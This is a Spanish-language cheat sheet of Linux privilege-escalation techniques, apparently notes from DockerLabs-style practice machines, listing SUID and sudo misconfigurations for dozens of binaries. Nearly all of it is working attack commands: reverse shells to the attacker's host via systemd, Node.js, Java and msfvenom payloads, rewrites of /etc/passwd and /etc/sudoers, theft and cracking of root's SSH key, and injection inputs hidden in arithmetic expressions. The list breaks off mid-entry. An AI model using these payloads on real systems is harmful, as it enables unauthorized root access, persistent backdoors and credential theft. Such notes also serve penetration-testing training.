Parte 1.-  Permisos SUID

find /  -perm -4000 2>/dev/null

find / -perm -u=s 2>/dev/null

binarios:  

A.-	/bin/systemctl

forma de vulnerarlo:

1.- crear un archivo root.service en tmp, con el siguiente código

[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target

2.- ejecutar el comando:

     /bin/systemctl enable /tmp/root.service

3.- poner en escucha el netcat en el puerto 9999

     nc -lvnp 9999

4.- ejecutar el comando
      
      /bin/systemctl start root

5.- ¡ ROOT !

-------------------------------------------------------------------------------

B.- 	/usr/bin/menu

escribimos strings /usr/bin/menu en la ruta inicial que estamos al momento de conectarnos por ssh
con el comando anterior obtuvimos de respuesta:
curl -I localhost

entonces nos vamos a /tmp
y ejecutamos:

echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu

en Enter your choice : escribimos 1

-------------------------------------------------------------------------------

C.-	/usr/bin/env

./env /bin/bash -p -> gtfobins

forma de ejecutar el comando.
/usr/bin/env /bin/sh -p

-------------------------------------------------------------------------------

D.-	/usr/bin/ls

si tenemos ese permiso entonces directamente buscamos ver el home de root

/usr/bin/ls /root

-------------------------------------------------------------------------------

E.-	/usr/bin/grep

LFILE=file_to_read
/usr/bin/grep '' $LFILE

-------------------------------------------------------------------------------


F.-	/usr/bin/find

/usr/bin/find . -exec /bin/sh -p \; -quit

-------------------------------------------------------------------------------


G.-	/usr/bin/dosbox

Lo explotamos modificando el etc sudoers de nuestro usuario:

ejemplo usuario ninhack

LFILE='\etc\sudoers.d\ninhack'

LFILE='/etc/sudoers.d/NINHACK'
/usr/bin/dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL) NOPASSWD: ALL >c:$LFILE" -c exit

ejcutamos sudo su y listo somos root

-------------------------------------------------------------------------------

H.-	/usr/bin/doas

ver la configuración
hacemos cat /etc/doas.conf

H.1.- ver lo que está permitido hacer
permit nopass steve as ajneya cmd cp

para este caso ( permit nopass steve as ajneya cmd cp ), hacemos:

1.- en kali:
ejecutamos el comando: ssh-keygen -t rsa -b 4096, luego copiamos el contendido de id_rsa.pub que se encuentra en /home/kali/.ssh

2.- en el objetivo:
nos dirijimos a /tmp y hacemos /tmp:

echo "contenido-id_rsa.pub" > authorized_keys

3.- en el objetivo:
mkdir .ssh

mv authorized_keys .ssh/

doas -u ajneya cp -r /tmp/.ssh/ /home/ajneya/

4.- ssh ajneya@10.0.2.4

tenemos acceso por ssh con el usuario ajneya

H.2.- permit nopass keepenv adam as root cmd /usr/bin/find

/usr/bin/doas -u root /usr/bin/find . -exec /bin/sh \; -quit

o 

/usr/bin/doas -u root /usr/bin/find . -exec /bin/sh -p \; -quit


-------------------------------------------------------------------------------

I.-	/usr/bin/python3.8

ejecutamos:

/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

listo somos root

-------------------------------------------------------------------------------

J.-	/usr/bin/curl


como tenemos curl disponible, voy a copiar el contenido de /etc/passwd
y en mi maquina atacante me creo un archivo passwd donde pego el contenido
de /etc/passwd de la maquina comprometida, modificando la primera linea
dejandola asi:

antes de modificar:	root:x:0:0:root:/root:/bin/bash
despues de modificar:	root::0:0:root:/root:/bin/bash

ahora desde mi maquina atacante levanto un servidor con python 

python3 -m http.server

luego, desde la maquina comprometida, como podemos ejecutar /usr/bin/curl como root
vamos a descargar el archivo que modificamos en la maquina atancante y guardarlo
en /etc/passwd, asi conseguimos modificar el contenido del archivo original

/usr/bin/curl http://172.17.0.1/passwd -o /etc/passwd

cat /etc/passwd |grep root
root::0:0:root:/root:/bin/bash

despues de validar los cambios, vemos que en efecto sobreescribimos el original
asi que ahora podemos escalar a root.

su root
#root

-------------------------------------------------------------------------------

k.- 	/usr/bin/dash

/usr/bin/dash -p

-------------------------------------------------------------------------------

L.- 	unshare

si estamos fuera de la carpeta dónde se encuentra unshare
/home/lenam/look/inside/unshare

/home/lenam/look/inside/unshare -r /bin/sh

si nos paramos en la carpeta dónde está unshare
./unshare -r /bin/sh


y listo somos root !!!

-------------------------------------------------------------------------------

M.-	/usr/bin/docker


/usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh


********************************************************
Parte2.- ver archivos que se ejecutan con privilegios de root o de otros usuarios previos para escalar a root. 

comando:
sudo -l

hay ocasiones que me permite escribir la contraseña, como por ejemplo en la máquina trust de dockerlabs

1.-	/usr/bin/vim 

escribimos el comando
sudo /usr/bin/vim -c ':!/bin/sh' 

presionamos enter y listo somos root

-------------------------------------------------------------------------------
2.-	/bin/bash

escribimos el comando:
sudo /bin/bash

presionamos enter y listo, somos root

otra forma, cuando se ejecuta un script bash.sh, eliminamos este y creamos uno nuevo

nano bash.sh 

#!/bin/bash

exec /bin/bash

le damos permisos de ejecucion chmod +x bash.sh

sudo /usr/local/bin/bash y listo somos root !!!

nota:

 nos aparezca:

User jenkhack may run the following commands on d27521ade326:
    (ALL : ALL) NOPASSWD: /usr/local/bin/bash


Significa que podemos ejecutar como root y que existe algún archivo con extensión sh que se ejecute, ahora para escalar privilegios lo que debemos hacer es encontrar ese archivo .sh

lo buscamos con:

find / -name *.sh 2>/dev/null

 y modificarlo o cambiarle de nombre y crear uno nuevo con el mismo nombre.

y colocarle este codigo

#!/bin/bash

exec /bin/bash

le damos permisos de ejecucion chmod +x archivo.sh

y luego ejecutar:

sudo /usr/local/bin/bash nombrearchivo.sh


-------------------------------------------------------------------------------

3.-	/usr/bin/env
escribimos el comado:
sudo /usr/bin/env /bin/bash


presionamos enter y listo, somos root
-------------------------------------------------------------------------------
4.-	/usr/bin/ruby	

User juan may run the following commands on d260d4a60dba:
    (ALL) NOPASSWD: /usr/bin/ruby

escribimos el comado:
sudo /usr/bin/ruby -e 'exec "/bin/sh"'

presionamos enter y listo, somos root

-------------------------------------------------------------------------------

5.-	 /usr/bin/python3 /opt/maintenance.py

User freddy may run the following commands on 3aec407d3f0a:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py

editamos el archivo /opt/maintenance.py

nano /opt/maintenance.py

le agregamos el codigo:

import os
os.system('/bin/bash')

echo "import os
os.system('/bin/bash')" > geo_ip.py

luego ejectuamos el comando:

sudo /usr/bin/python3 /opt/maintenance.py

listo somos root !!!

hay ocasiones en que no podemos crear en ciertos directorios, para eso tenemos que verificar que tipo de permisos tenemos con el siguiente comando ls -l nombre-directorio.

Ver la forma de escalar privilegios de la máquina secretjenkins de dockerlabs

En el caso de la máquina secretjenkins, para escalar a root, tenemos que hacer el aritificio de cambiar el nombre del archivo script.py a scripts.py y luego crear un archiv con: 

echo "import os
os.system('/bin/bash')" > script.py 

para luego ejecutar:

sudo /usr/bin/python3 /opt/script.py

y listo somos root !!!


* otra casuistica es que no hay un archivo .py entonces hacemos

sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'

listo somos root !!!

* User 404-page may run the following commands on a9ae03d11295:
    (200-ok : 200-ok) /home/404-page/calculator.py


modificamos o cambiamos de nombre al a calculator.py como cal.py y creamos un calculator.py, agregamos el siguiente código:

import os
os.system('/bin/bash')

si al ejecutar:

sudo -u 200-ok /home/404-page/calculator.py

me sale este error:

/home/404-page/calculator.py: 1: import: not found
/home/404-page/calculator.py: 2: Syntax error: word unexpected (expecting ")")

debemos agregarle al archivo (en la primera línea)
#!/usr/bin/env python3

el archivo calculator quedaría así:

#!/usr/bin/env python3
import os
os.system('/bin/bash')

y volvemos a ejecutar:

sudo -u 200-ok /home/404-page/calculator.py

como también ejecutamos el script para luego ejecutar __import():

sudo -u 200-ok /home/404-page/calculator.py

calculator> __import__('os').system('id')
calculator> __import__('os').system('bash')

listo somos el usuario 200-ok

-------------------------------------------------------------------------------

6.-	/usr/bin/node /home/mario/script.js	

User mario may run the following commands on b1a75e40f255:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js

para escalar privilegios lo que haremos es modificar el archivo script.js para obtener una shell con permisos root:

agregamos este código:

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(PORT-NC, "IP-KALI", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

luego nos ponemos en escucha por el puerto 443 y ejecutamos el archivo script.js de la siguiente manera:

sudo /usr/bin/node /home/mario/script.js

nc -lvnp 4433 y listo somos root

-------------------------------------------------------------------------------

7.-	/usr/bin/awk 
User luisillo may run the following commands on ae271debc19a:
    (ALL) NOPASSWD: /usr/bin/awk

entonces ejecute el comando:

sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'

y listo somos root !!!

-------------------------------------------------------------------------------

8.- 	/usr/bin/java
User pinguinazo may run the following commands on 4fb091c23ccd:
    (ALL) NOPASSWD: /usr/bin/java


Forma 1:

creamos un archivo java en tmp:

touch exploit.java
lo abrimos con nano:

public class shell {
   public static void main(String[] args) {
       Process p;
       try {
           p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/IP-KALI/port-netcat 0>&1");
           p.waitFor();
           p.destroy();
       } catch (Exception e) {}
   }
}

sudo /usr/bin/java exploit.java

previamente nos ponemos en escucha en el puerto de netcat elegido y listo somos root !!!


Forma 2:

User augustus may run the following commands on 0acc3e139d70:
    (dylan) /usr/bin/java

2.1-Con msfvenom en nuestro kali, creamos un archivo .jar

msfvenom -p java/shell_reverse_tcp 192.168.0.26 4444 -f jar -o revshell.jar

2.2- Le damos permisos

chmod +x revshell.jar

2.3- Lo enviamos a la máquina víctima con scp

enviar desde kali a la máquina víctima
scp revshell.jar augustus@172.17.0.2:/tmp/revshell.jar

o

inicar un servidor con python y con wget o con curl enviarlo a la máquina víctima

augustus@172.17.0.2's password:
revshell.jar

2.4- En la máquina atacante con netcat

nc -nlvp 4444
listening on [any] 4444 ...

2.5- En la máquina víctima

augustus@62c2a83e112d:/tmp$ sudo -u dylan /usr/bin/java -jar /tmp/revshell.jar


2.6- Obteniendo conexión en la máquina atacante

nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.0.26] from (UNKNOWN) [172.17.0.2] 53368
bash
whoami
dylan


-------------------------------------------------------------------------------
9.-  	 /usr/bin/cut , /usr/bin/grep

User www-data may run the following commands on f4f04dfa4361:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep

lo de las líneas arriba significa que podemos ver archivos que tienen permisos de root.

entonces buscamos algo parecido a lo mencionado.

en opt encontramos una nota.txt que decía lo siguiente:

Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.


entonces para visualizar la clave.txt utilizamos el binario cut:

sudo cut -d "" -f1 "$FILE"

forma de ejecutar:

sudo cut -d "" -f1 "/root/clave.txt"

la clave es:

dockerlabsmolamogollon123

entonces accedemos como root con:

su root:

escribimos la clave y listo somos root !!!

-------------------------------------------------------------------------------

10.-	/usr/bin/python3 /opt/script.py 
User carlos may run the following commands on 9ddc4942d02b:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py

entramos en opt, renombramos el archivo script.py a scripts.py, creamos un archivo script.py con el siguiente código:

import os
os.system("/bin/sh")


le damos persmisos

chmod 777 script.py

luego ejecutamos:

sudo /usr/bin/python3 /opt/script.py

y listo, somos root !!!

-------------------------------------------------------------------------------

11.-	/opt/bash

User toctoc may run the following commands on c149f26a05b1:
    (ALL : NOPASSWD) /opt/bash

sudo /opt/bash

-------------------------------------------------------------------------------

12.-	/bin/bash /opt/penguin.sh

(ALL) NOPASSWD: /bin/bash /opt/penguin.sh

tenemos que analizar el código de penguin.sh y ver que es lo que hace para luego así ver que si podemos ingresar comandos, ya que no se tiene permisos de escritura ni en el archivo ni el directorio opt

codigo de penguin.sh

read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi


ejecutar de la siguiente manera:

sudo /bin/bash /opt/penguin.sh

luego cuando pide ingresar algo colocamos:

a[$(whoami>&2)]+42 -> me indica un mensaje que somos root:

ahora el comando que debemos ingresar para escalar privilegios es:

a[$(/bin/bash>&2)]+42

y listo somos root !!!

-------------------------------------------------------------------------------

13.-	/usr/bin/base64
User verde may run the following commands on c6b7ad24b5ac:
    (root) NOPASSWD: /usr/bin/base64

Para este caso es tener ese resultado del sudo -l y el puerto ssh abierto.
 
Paso 1:
sudo base64 /root/.ssh/id_rsa | base64 --decode

Paso 2:
Si recordamos el puerto 22 estaba abierto, entonces tratamos de leer el id_rsa de root para poder loggearnos.

Paso 3:
Nos copiamos este id_rsa en nuestra máquina atacante, y con ssh2john sacamos el hash de esta clave.

ssh2john id_rsa > hash

Paso 4:
Por último con John The Ripper y el clásico rockyou crackeamos el passphrase de la clave.

john hash --wordlist=/usr/share/wordlists/rockyou.txt

Nos mostrará lo siguiente:

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)           *_*  
1g 0:00:01:23 DONE (2024-05-23 15:15) 0.01197g/s 42.52p/s 42.52c/s 42.52C/s cougar..01234
Use the "--show" option 

Paso 5:
Por último le damos los permisos necesarios a id_rsa y con ssh deberíamos conectarnos como root...

chmod 600 id_rsa

Nos conectamos por ssh:

ssh -i id_rsa root@172.17.0.2
y de parafrase colocamos honda1

y listo somos root !!!

-------------------------------------------------------------------------------

14.-	/usr/bin/php

User mateo may run the following commands on 9dfea1ef62cf:
    (ALL) NOPASSWD: /usr/bin/php

Escribimos
CMD="/bin/sh"

presionamos enter y luego escribimos

sudo /usr/bin/php -r "system('$CMD');"

presionamos enter y listo somos root !!!

-------------------------------------------------------------------------------
15.-	/usr/bin/bettercap

User agua may run the following commands on 28c2e1cc6a7d:
    (root) NOPASSWD: /usr/bin/bettercap

ejecutamos bettercap
sudo /usr/bin/bettercap

! chmod +s /bin/bash

Salimos de bettercap, luego, hacemos un /bin/bash -p y ya seremos usuarios root !!!

-------------------------------------------------------------------------------

16.-	/usr/bin/cpulimit 

sudo cpulimit -l 100 -f /bin/sh

ejemplo:

(red) NOPASSWD: /usr/bin/cpulimit

sudo -u red cpulimit -l 100 -f /bin/sh
-------------------------------------------------------------------------------

17.-	/usr/bin/rename

páginas man

(root) NOPASSWD: /usr/bin/rename

forma de verificar que es un página man:

sudo -u root /usr/bin/rename -h

resultado del comando:

-m, --man
            Manual: print manual page.

sudo -u root /usr/bin/rename -m

luego remplazamos lo que está subrayado por:

!/bin/bash , presionamos enter y listo somos root !!!

-------------------------------------------------------------------------------

18.-	/usr/bin/nano

(TAMBIÉN APLICA PARA SUID)

(ALL) NOPASSWD: /usr/bin/nano

si hacemos su root, no pedirá contraseña

ahora hacemos sudo /usr/bin/nano /etc/passwd
elminamos la X

root:x:0:0:root:/root:/bin/bash

como debe de quedar:
root::0:0:root:/root:/bin/bash

luego hacemos su root, no me pide contraseña y listo somos root.

Otra forma:

User www-data may run the following commands on be6e17c3b556:
    (firsthacking) NOPASSWD: /usr/bin/nano

sudo -u firsthacking /usr/bin/nano
ctrl R ctrl X
reset; sh 1>&0 2>&0 -> lo escribimos en Command to execute

-------------------------------------------------------------------------------
19.-	/bin/dd

User "usuario_en_sesion may run the following commands on 101e4b7e294b:
    (ALL) NOPASSWD: /bin/dd
    
    
LFILE=/etc/sudoers
echo "usuario_en_sesion ALL=(ALL:ALL) ALL" | sudo dd of=$LFILE

Una vez hecho esto ya tendremos permisos root para todos los comandos, y solo escalamos ejecutando sudo su y poniendo la contraseña de del usuario_en_sesión.

-------------------------------------------------------------------------------20.-	/usr/bin/chown

User elite may run the following commands on ac078a14e272:
    (root) NOPASSWD: /usr/bin/chown

sudo chown elite:elite /etc

sudo chown username:username /etc

sudo /usr/bin/chown elite:elite /etc/passwd

ls -l / -> para ver si cambiamos de propietario en el etc

sed 's/x//g' /etc/passwd
sed -i 's/x//g' /etc/passwd

luego su root y sin escribir contraseña somos root

-------------------------------------------------------------------------------21.-	/bin/sed

(andy) NOPASSWD: /bin/sed

sudo -u andy /bin/sed -n '1e exec sh 1>&0' /etc/hosts


-------------------------------------------------------------------------------
22.- 	/usr/sbin/service


User www-data may run the following commands on 085b05b2ee08:
    (ALL) NOPASSWD: /usr/sbin/service

sudo /usr/sbin/service ../../bin/sh


-------------------------------------------------------------------------------
23.-	/usr/bin/man

forma de cambiar a usuario pingu:

sudo -u pingu /usr/bin/man find, se nos abre un menú interactivo y en la línea donde dice --More--, reemplazamos por:

!/bin/bash y listo somo el usuario pingu:

-------------------------------------------------------------------------------
23.-	/usr/bin/dpkg



forma 1 de cambiar a usuario gladys:

sudo -u gladys /usr/bin/dpkg -l find, se nos abre un menú interactivo y en la línea donde dice --More--, reemplazamos por:

!/bin/sh y listo somo el usuario gladys


forma 2:

si al ejecutar el comando anterior me sale este mensaje:

dpkg-query: no packages found matching find

entonces escalamos de la siguiente manera:

sudo -u gladys /usr/bin/dpkg -l, se nos abre un menú interactivo y en la línea donde dice --More--, reemplazamos por:

!/bin/sh y listo somo el usuario gladys

-------------------------------------------------------------------------------

24.-	/usr/bin/socat

User nasa may run the following commands on 995cd3ed7c7e:
    (elite) NOPASSWD: /usr/bin/socat


sudo -u elite /usr/bin/socat stdin exec:/bin/sh


listo somos elite

-------------------------------------------------------------------------------

25.-	/usr/bin/perl

User vaxei may run the following commands on cbf14c17920d:
    (luisillo) NOPASSWD: /usr/bin/perl

sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'

-------------------------------------------------------------------------------

26.-	/usr/bin/find

User www-data may run the following commands on 99b5831516fa:
(rafa) NOPASSWD: /usr/bin/find

sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit

-------------------------------------------------------------------------------

27.-	/usr/sbin/debugfs

User rafa may run the following commands on 99b5831516fa:
    (ruben) NOPASSWD: /usr/sbin/debugfs

sudo -u ruben /usr/sbin/debugfs

se abre algo parecido a esto:

debugfs 1.47.0 (5-Feb-2023)
debugfs: *

reemplazamos * por !/bin/sh

debugfs 1.47.0 (5-Feb-2023)
debugfs: !/bin/sh

presionamos enter

-------------------------------------------------------------------------------

28.-	/bin/posh

User joe may run the following commands on 1bea950f0dc2:
    (luciano) NOPASSWD: /bin/posh

sudo -u luciano /bin/posh

-------------------------------------------------------------------------------

29.-	/usr/bin/ash

User daphne may run the following commands on 4d0d8a20317b:
    (vilma) NOPASSWD: /usr/bin/ash

sudo -u vilma /usr/bin/ash

-------------------------------------------------------------------------------

30.-	 /usr/bin/lua


User shaggy may run the following commands on 4d0d8a20317b:
    (fred) NOPASSWD: /usr/bin/lua


sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'

-------------------------------------------------------------------------------

31.-	/usr/bin/gcc

User fred may run the following commands on 4d0d8a20317b:
    (scooby) NOPASSWD: /usr/bin/gcc


sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .

-------------------------------------------------------------------------------

32.-	/usr/bin/sudo

User scooby may run the following commands on 4d0d8a20317b:
    (root) NOPASSWD: /usr/bin/sudo

sudo /usr/bin/sudo /bin/sh

-------------------------------------------------------------------------------

33.-	ALL

User tails may run the following commands on 2ab230627b6e:
    (sonic) NOPASSWD: ALL

sudo -u sonic /bin/bash

(ALL) ALL

sudo su y listo somos root, sin escribir contraseña

-------------------------------------------------------------------------------

34.-	/usr/bin/puttygen

Ejecutamos en orden:

34.1 puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id

34.2 puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys

34.3 sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/id

34.4 sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh


Y en nuestra máquina atacante nos descargamos la clave y nos conectamos como root:

scp curiosito@172.17.0.2:/home/curiosito/.ssh/id .

ssh -i id root@172.17.0.2

-------------------------------------------------------------------------------

35.- 	/usr/bin/tree
	/usr/bin/cat

User juan may run the following commands on edd63d412442:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat

listar el conternido de /home/carlos

sudo -u carlos /usr/bin/tree /home/carlos 

respuesta: password (ejemplo)

sudo -u carlos /usr/bin/cat /home/carlos/password

respuesta: 123456 (ejemplo)

También se puede ver archivos donde el usuario no tiene acceso de lectura.

-------------------------------------------------------------------------------

36.-	/usr/bin/tee

User carlos may run the following commands on edd63d412442:
    (ALL : NOPASSWD) /usr/bin/tee

siendo el usuario carlos, ejecutamos el siguiente comando:

echo 'carlos ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/tee -a /etc/sudoers

luego ejecutamos

sudo -i

y listo somos root !!!

-------------------------------------------------------------------------------

37.-	/usr/bin/docker

User firsthacking may run the following commands on be6e17c3b556:
    (ALL) NOPASSWD: /usr/bin/docker


sudo /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh

-------------------------------------------------------------------------------

38.-	(ALL) NOPASSWD: ALL
                      (ALL : ALL) ALL


User octopus may run the following commands on 868412c835de:
    (ALL) NOPASSWD: ALL
    (ALL : ALL) ALL


sudo chmod u+s /bin/bash
bash -p

-------------------------------------------------------------------------------

39.-	/usr/bin/apt

User john may run the following commands on 3e1d7f4234cf:
    (bobby) NOPASSWD: /usr/bin/apt

ejecutamos
sudo -u bobby /usr/bin/apt changelog apt

solo escribimos
!/bin/bash

presionamos enter

-------------------------------------------------------------------------------

40.-	/usr/bin/file

este binario te permite ver archivo que tiene permisos de lectura solo para root.

ejemplo, supongamos que hay un archivo en /opt/password.txt que tiene permisos de lectura y escritura para root, podemos verlo con:

LFILE=/opt/password.txt
sudo /usr/bin/file -f $LFILE

-------------------------------------------------------------------------------

41.-	/usr/bin/links

(root) NOPASSWD: /usr/bin/links

sudo /usr/bin/links -no-g

presiono la tecla esc

luego en el menú que te aparece, nos vamos a FILE, bajamos y le damos en OS SHELL y listo somos root.

-------------------------------------------------------------------------------

42.-	/usr/bin/cut

(chocolatito) NOPASSWD: /usr/bin/cut

con el binario cut podemos extraer texto.

entonces buscamos archivos del usuario chocolatito dentro del sistema:

find / -type f -user chocolatito 2>/dev/null

ejemplo: /opt/chocolatitocontraseña.txt

ejecutamos para ver chocolatitocontraseña.txt:

sudo -u chocolatito cut -f 1 /opt/chocolatitocontraseña.txt

-------------------------------------------------------------------------------

43.-	/usr/bin/sed

(root) NOPASSWD: /usr/bin/sed

sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts

(javier) NOPASSWD: /usr/bin/sed

sudo -u javier /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts

-------------------------------------------------------------------------------

44.-	/usr/bin/clush

(ALL : ALL) NOPASSWD: /usr/bin/clush

sudo /usr/bin/clush -w node[11-14] -b

Enter 'quit' to leave this interactive mode
Working with nodes: node[11-14]
clush> !chmod u+s /bin/bash
clush> quit

bash -p

listo somos root

-------------------------------------------------------------------------------

45.- 	/home/alice/scripts/*.rb

User alice may run the following commands on ee1bacc7912d:
    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb

Esto quiere decir que cualquier usuario puede ejecutar cualquier script en rugby (rb) dentro de /home/alice/scripts:

Entonces se crea un script para elevar privilegios.

script.rb

# Script para ejecutar comandos como root

# Ejecutar un comando como root
def ejecutar_comando
  puts "Escribe el comando que quieres ejecutar como root:"
  print "> "
  comando = gets.chomp
  puts "Ejecutando: #{comando}"
  resultado = `#{comando}` # Ejecuta el comando
  puts "Resultado:\n#{resultado}"
end

# Crear un shell interactivo como root
def shell_root
  puts "Iniciando una shell interactiva como root..."
  exec "/bin/bash"
end

puts "¿Qué quieres hacer?"
puts "1. Ejecutar un comando como root"
puts "2. Abrir una shell interactiva como root"
print "> "
opcion = gets.chomp.to_i

if opcion == 1
  ejecutar_comando
elsif opcion == 2
  shell_root
else
  puts "Opción no válida"
end


luego se le da permisos de ejecución:
chmod +x script.rb

luego:

sudo /home/alice/scripts/script.rb

y listo somos root.

-------------------------------------------------------------------------------

46.-	/home/codebad/code

 si tenememos un archivo ELF(Executable and Linkable Format) en C que lea archivos del sistema: ls

ejemplo:
soy el usuario codebad: y ejecuto sudo -l

User codebad may run the following commands on 76aa71834ef3:
    (metadata : metadata) NOPASSWD: /home/codebad/code

el archivo code es un archivo ELF que solo ejecuta ls

artificio para migrar al usuario metadata 

sudo -u metadata /home/codebad/code "-l /home/metadata/user.txt | bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/4445 0>&1' "

-------------------------------------------------------------------------------

47.-	/usr/bin/c89

User metadata may run the following commands on 76aa71834ef3:
    (ALL : ALL) /usr/bin/c89

sudo /usr/bin/c89 -wrapper /bin/sh,-s .

-------------------------------------------------------------------------------

48.-	/usr/bin/git

sudo /usr/bin/git -help config

!/bin/sh

!/bin/bash

-------------------------------------------------------------------------------

49.-	/usr/bin/mcedit

sudo /usr/bin/mcedit

Se abre el editor y luego hacemos enter en:

File > user menu > invoke shell

-------------------------------------------------------------------------------

50.-	/usr/bin/ssh-keygen * /opt/

(root) NOPASSWD: /usr/bin/ssh-keygen * /opt/*

sudo ssh-keygen -D ./lib.so

pasos:

en kali

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f elf-so -o lib.so

python3 -m http.server 8080

nc -lvnp 443

este archivo lo descargo en tmp de la máquina objetivo con wget o curl

previamente en el objetivo 
con el usuario steve, sudo -l

(decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee

cat /tmp/lib.so | sudo -u decoder /usr/bin/tee /opt/decode/lib.so

en objetivo con el usuario ajneya

sudo ssh-keygen -D /opt/decode/lib.so

listo somos root

-------------------------------------------------------------------------------

51.-	/usr/bin/xxd

Tenemos que buscar un archivo que sea o pertenezca a root para poder visualizar.

ejemplo:

data.bak que está dentro del directorio root

sudo /usr/bin/xxd /root/data.bak

me muestra el contenido de data.bak, en este caso tiene las credenciales de root.

su root, escribimos la contraseña y listo somos root.

-------------------------------------------------------------------------------

52.-	Siempre que tengamos un binario y no esté en gtfobinds lo ejecutamos para ver que hace

ejemplo :

ejecutando sudo -l

(ALL) NOPASSWD: /bin/cube

probamos:

sudo /bin/cube

y supongamos que nos permita intruducir numeros:

introducimos:

a[$(/bin/sh >&2)]+666

y listo somos root

-------------------------------------------------------------------------------

53.-	/bin/tar

(ALL) NOPASSWD: /bin/tar

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

-------------------------------------------------------------------------------

54.-	/bin/vi

/bin/vi /etc/postgresql/11/main/pg_hba.conf 

hacemos sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf 

presionamos " : "

escribimos shell presionamos enter y somos root

-------------------------------------------------------------------------------

55.-	/usr/bin/multitail

User lucifer may run the following commands on lower4:
    (root) NOPASSWD: /usr/bin/multitail

versión

multitail 6.5.0

sudo -u root /usr/bin/multitail -l "chmod 4755 /bin/bash"

presionamos ctrl + c para salir luego ejecutamos:

/bin/bash -pi

listo soy root

-------------------------------------------------------------------------------

56.-	/usr/bin/bash

(s3cur4) NOPASSWD: /usr/bin/bash

sudo -u s3cur4 /usr/bin/bash

-------------------------------------------------------------------------------

57.-	/usr/bin/nmap

opción 1, ejecutamos los siguientes comandos:	

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

opción 2, ejecutamos los siguientes comandos:

sudo nmap --interactive
nmap> !sh

-------------------------------------------------------------------------------

58.-	/usr/bin/c99

(dustin) NOPASSWD: /usr/bin/c99

sudo -u dustin /usr/bin/c99 -wrapper /bin/sh,-s .

-------------------------------------------------------------------------------

59.-	/usr/bin/ssh-agent

(root) NOPASSWD: /usr/bin/ssh-agent

sudo /usr/bin/ssh-agent /bin/bash

-------------------------------------------------------------------------------

60.-	/usr/bin/joe

(root) NOPASSWD: /usr/bin/joe

ejecutamos

sudo /usr/bin/joe

se abre una ventana interactiva, presiono

ctrl + k 

luego presiono la tecla " ! "

/bin/sh y presiono enter y listo somos root

-------------------------------------------------------------------------------
61.-	 /usr/bin/tmux

(root) NOPASSWD: /usr/bin/tmux

sudo /usr/bin/tmux

-------------------------------------------------------------------------------
62.-	/usr/bin/zzuf

/usr/bin/zzuf -help

sudo /usr/bin/zzuf -c chmod 4755 /bin/bash

bash -p

-------------------------------------------------------------------------------

63.-	/usr/bin/python3

(angela) NOPASSWD: /usr/bin/python3

sudo -u angela /usr/bin/python3 -c 'import os; os.system("/bin/sh")'

-------------------------------------------------------------------------------

64.-	/usr/bin/sh

(darlene) NOPASSWD: /usr/bin/sh

sudo -u darlene /usr/bin/sh

-------------------------------------------------------------------------------

65.-	/usr/bin/ssh

 (tony) NOPASSWD: /usr/bin/ssh

sudo -u tony /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x

-------------------------------------------------------------------------------

66.-	/usr/bin/yafc

(root) NOPASSWD: /usr/bin/yafc

sudo /usr/bin/yafc

yafc 1.3.7

nos aparece una ventana interactiva:

yafc > 

ejecutamos

yafc > shell 

listo somos root !!!

67.-	/usr/bin/html2text

(root) NOPASSWD: /usr/bin/html2text

podemos ver archivos en texto plano

ejemplo id_rsa de root

sudo /usr/bin/html2text /root/.ssh/id_rsa

68.-	/usr/bin/nokogiri

nokogiri es una herramienta Ruby. Te permite ejecutar código Ruby si usás el flag -e (execute)

(root) NOPASSWD: /usr/bin/nokogiri

